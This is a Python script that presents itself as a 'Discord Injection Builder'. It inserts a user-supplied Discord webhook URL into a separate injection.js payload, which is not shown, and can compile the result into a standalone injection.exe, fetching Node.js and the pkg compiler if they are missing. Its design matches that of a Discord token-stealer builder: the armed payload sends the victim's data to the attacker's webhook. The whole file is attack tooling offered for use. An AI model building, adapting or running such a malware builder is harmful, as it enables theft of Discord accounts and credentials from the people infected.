import os
import shutil
import subprocess
import sys
import urllib.request
from colorama import Fore, Style, init

init()

INJECTION_SOURCE = 'injection.js'
INJECTION_OUTPUT = 'build_injection.js'
NODEJS_URL = 'https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi'
NODEJS_INSTALLER = 'node_installer.msi'

def print_banner():
    print(f"{Fore.MAGENTA}=== Discord Injection Builder ==={Style.RESET_ALL}")

def is_command_available(cmd):
    return shutil.which(cmd) is not None

def download_nodejs():
    print(f"{Fore.YELLOW}Node.js is not installed. Downloading Node.js installer...{Style.RESET_ALL}")
    try:
        urllib.request.urlretrieve(NODEJS_URL, NODEJS_INSTALLER)
        print(f"{Fore.GREEN}Node.js installer downloaded: {NODEJS_INSTALLER}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Starting Node.js installer... Please follow the installation steps and add Node.js to PATH!{Style.RESET_ALL}")
        os.startfile(NODEJS_INSTALLER)
        print(f"{Fore.CYAN}After installation, please close and reopen your terminal, then run this tool again!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Failed to download or start Node.js installer: {str(e)}{Style.RESET_ALL}")
    sys.exit(1)

def ensure_node_and_pkg():

    if not is_command_available('node'):
        download_nodejs()
        return False

    if not is_command_available('npm'):
        print(f"{Fore.RED}npm is not installed! Please reinstall Node.js and ensure npm is included.{Style.RESET_ALL}")
        return False

    if not is_command_available('pkg'):
        print(f"{Fore.YELLOW}pkg is not installed. Installing pkg globally...{Style.RESET_ALL}")
        try:
            result = subprocess.run(['npm', 'install', '-g', 'pkg'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{Fore.GREEN}pkg installed successfully!{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}Failed to install pkg! Output:{Style.RESET_ALL}\n{result.stderr}")
                return False
        except Exception as e:
            print(f"{Fore.RED}Error installing pkg: {str(e)}{Style.RESET_ALL}")
            return False
    return True

def main():
    print_banner()
    webhook = input(f"{Fore.CYAN}Enter your Discord webhook URL: {Style.RESET_ALL}").strip()
    if not webhook.startswith('http'):
        print(f"{Fore.RED}Invalid webhook URL!{Style.RESET_ALL}")
        return
    if not os.path.exists(INJECTION_SOURCE):
        print(f"{Fore.RED}Source file '{INJECTION_SOURCE}' not found!{Style.RESET_ALL}")
        return
    with open(INJECTION_SOURCE, 'r', encoding='utf-8') as f:
        content = f.read()
    if '%WEBHOOK%' not in content:
        print(f"{Fore.RED}No %WEBHOOK% placeholder found in injection.js!{Style.RESET_ALL}")
        return
    content = content.replace('%WEBHOOK%', webhook)
    with open(INJECTION_OUTPUT, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f"{Fore.GREEN}Injection file built successfully: {INJECTION_OUTPUT}{Style.RESET_ALL}")

    choice = input(f"{Fore.YELLOW}Do you want to compile to .exe using pkg? (y/n): {Style.RESET_ALL}").strip().lower()
    if choice == 'y':
        if not ensure_node_and_pkg():
            print(f"{Fore.RED}Cannot compile to .exe without Node.js and pkg!{Style.RESET_ALL}")
            return
        print(f"{Fore.CYAN}Compiling to .exe...{Style.RESET_ALL}")
        exit_code = os.system(f"pkg {INJECTION_OUTPUT} --output injection.exe")
        if exit_code == 0:
            print(f"{Fore.GREEN}Successfully compiled to injection.exe!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Compilation failed. Make sure Node.js and pkg are installed!{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}You can manually compile with: pkg {INJECTION_OUTPUT} --output injection.exe{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
# update
